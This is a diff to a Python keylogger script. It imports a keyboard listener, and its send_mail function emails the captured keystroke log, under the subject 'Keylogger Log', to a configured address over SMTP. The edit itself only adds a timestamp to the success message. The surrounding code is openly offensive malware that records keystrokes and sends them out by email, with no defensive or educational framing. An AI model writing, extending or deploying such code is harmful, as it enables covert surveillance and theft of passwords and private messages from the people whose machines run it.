@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 import os, smtplib, time, schedule, signal, sys
+from datetime import datetime
 from colorama import Fore, Style, Back
 from pynput.keyboard import Listener
 from threading import Timer
@@ -62,7 +63,7 @@ def send_mail(log_content):
         message = f"From: keylogger@example.com\nTo: {EMAIL}\nSubject: Keylogger Log\n\n{log_content}"
         server.sendmail(EMAIL, EMAIL, message)
         server.quit()
-        print(f"{Fore.LIGHTGREEN_EX+Style.BRIGHT}\n[+] Log sent successfully{Style.RESET_ALL}")
+        print(f"{Fore.LIGHTGREEN_EX+Style.BRIGHT}\n[+] Log sent successfully {Style.DIM}{Fore.LIGHTWHITE_EX}({datetime.now():%d/%m/%Y %H:%M:%S})")
     except Exception as e:
         print(f"[!] Error while sending mail: {e}")
 
